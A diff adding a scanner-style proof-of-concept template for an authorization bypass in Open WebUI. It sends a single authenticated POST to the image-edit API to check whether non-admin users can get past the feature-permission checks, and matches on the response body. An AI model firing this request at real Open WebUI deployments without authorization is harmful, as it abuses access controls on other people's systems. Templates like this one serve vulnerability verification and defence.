@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 中已认证非管理员用户能否绕过 ENABLE_IMAGE_EDIT 和 features.image_generation 权限检查调用 /api/v1/images/edit 接口"
+id = "POC-AVE-2026-0826"
+name = "Open WebUI 图片编辑接口授权绕过漏洞 PoC"
+severity = "medium"
+tags = ["ave-2026-0826"]
+vuln_id = [
+    "CVE-2026-59227",
+    "AVE-2026-0826",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/images/edit"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"prompt":"test","model":"dall-e-3","n":1,"size":"1024x1024"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "data",
+    "url",
+    "image",
+]
